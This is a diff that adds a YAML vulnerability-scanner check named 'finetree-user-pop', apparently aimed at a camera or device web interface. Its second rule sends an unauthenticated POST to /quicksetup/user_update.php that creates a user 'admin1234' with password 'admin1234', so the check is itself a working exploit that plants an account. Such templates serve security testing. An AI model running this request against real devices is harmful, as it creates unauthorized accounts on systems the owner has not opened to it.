@@ -1,0 +1,14 @@
+name: finetree-user-pop
+rules:
+  r0:
+    request:
+      method: GET
+      path: /quicksetup/user_pop.php?method=add
+    expression: response.status == 200 && response.body.bcontains(b'name="user_name_field"') && response.body.bcontains(b'name="password_field"') && response.body.bcontains(b'name="confirm_password_field"')
+  r1:
+    request:
+      method: POST
+      path: /quicksetup/user_update.php
+      body: "method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0"
+    expression: response.status == 200 && response.headers["server"].icontains("WintenDo") && (response.body.bcontains(b'200') || response.body.bcontains(b'804'))
+expression: r0() && r1()
